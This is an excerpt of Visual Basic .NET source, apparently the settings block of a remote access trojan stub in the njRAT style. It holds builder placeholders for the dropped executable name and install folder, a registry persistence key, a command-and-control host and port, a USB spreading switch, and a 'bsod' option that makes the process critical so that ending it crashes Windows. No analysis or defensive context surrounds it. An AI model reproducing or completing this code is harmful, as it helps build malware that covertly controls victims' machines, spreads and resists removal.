...
#Region "Settings"
    ...
    Public MTX As String = "" ' Dont Change
    Public MT As Mutex = Nothing
    Public EXE As String = "%exe%" ' change it to "server.exe"
    Public DR As String = "%dir%" ' change it to "temp","appdata","windir"
    Public RG As String = "%rg%" ' My Registry Key
    Public H As String = "%host%" ' Host
    Public P As String = "%port%" ' PORT
    Public SPR As Boolean = "%usb%" ' TRUE,FALSE
    Public Y As String = "|'|'|" ' Dont Change This<<
    Public BD As Boolean = "%bsod%" ' protect process , replace %bsod% with "True" for protect And "False" For unprotect
#End Region
